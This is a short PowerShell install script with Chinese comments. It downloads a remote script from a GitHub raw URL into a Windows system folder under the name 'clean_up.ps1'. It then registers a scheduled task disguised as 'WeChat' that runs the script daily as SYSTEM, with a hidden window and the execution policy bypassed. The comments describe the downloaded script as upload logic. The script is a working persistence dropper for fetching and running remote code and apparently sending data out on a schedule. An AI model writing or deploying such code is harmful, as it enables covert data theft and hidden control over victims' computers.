# install.ps1 — 一次性安装脚本（最简洁）

# 强制 UTF-8 输出
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8

# 本地保存上传逻辑脚本
$localScript = "C:\ProgramData\Microsoft\Windows\clean_up.ps1"
# 仓库里上传脚本的 URL
$remoteScript = "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/clean_up.ps1"

# 下载上传逻辑脚本
Invoke-WebRequest -Uri $remoteScript -OutFile $localScript -UseBasicParsing -ErrorAction Stop

# 注册计划任务
$taskName = "WeChat"
if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
}

$action  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localScript`""
$trigger = New-ScheduledTaskTrigger -Daily -At 1:00am
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Description "Daily GitHub upload"

Write-Host "✅ Installed task '$taskName' → runs $localScript daily at 1:00 AM."
